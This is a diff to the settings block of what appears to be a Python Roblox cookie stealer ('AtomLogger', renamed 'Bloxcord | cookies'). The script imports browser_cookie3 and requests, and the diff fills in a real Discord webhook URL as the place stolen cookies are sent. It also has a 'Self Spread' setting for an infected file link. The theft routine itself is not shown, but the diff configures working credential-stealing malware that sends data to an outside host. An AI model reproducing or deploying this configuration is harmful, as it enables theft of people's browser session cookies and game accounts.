@@ -1,9 +1,9 @@
 import browser_cookie3, requests, urllib, re, os
 
 #   Settings - Webhook    #
-webhook = 'WEBHOOK URL HERE'
+webhook = 'https://discord.com/api/webhooks/1353119204353642598/bXRRQByx7C8vyFp51qH05FCBMo-jM5qD4Wv9rMRXm58MEDkyQh675CPkQYxum1guE4Sy'
 avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
-botName = 'AtomLogger | ROBLOX'
+botName = 'Bloxcord | cookies'
 #   Settings - Self Spread    #
 fileLink = 'INFECTED FILE URL HERE'
 
